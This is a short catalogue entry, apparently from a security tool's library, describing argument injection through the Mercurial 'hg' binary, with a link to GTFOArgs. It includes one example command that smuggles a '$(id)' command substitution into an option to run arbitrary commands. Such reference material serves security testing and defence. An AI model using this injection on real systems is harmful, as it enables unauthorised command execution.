---
trust_level: community
id: argument-injection-hg
namespace: argument:injection:hg
name: hg
description: "Argument injection via hg"
version: "1.0.0"
capabilities:
  - security.execution.command
  - network.transfer.upload
platforms:
  - cross-platform
techniques:
  - execution
  - exfiltration
execution:
  template: "hg"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
references:
  - label: "GTFOArgs"
    url: "https://gtfoargs.github.io/gtfoargs/hg/"
---
examples:
  - description: "Use argument injection to execute arbitrary commands"
    command: "hg --option=\"\\\"\\$(id)\\\"\""

# hg

GTFOArgs entry for hg. This binary can be used to inject arguments for execution, file operations, or other capabilities.
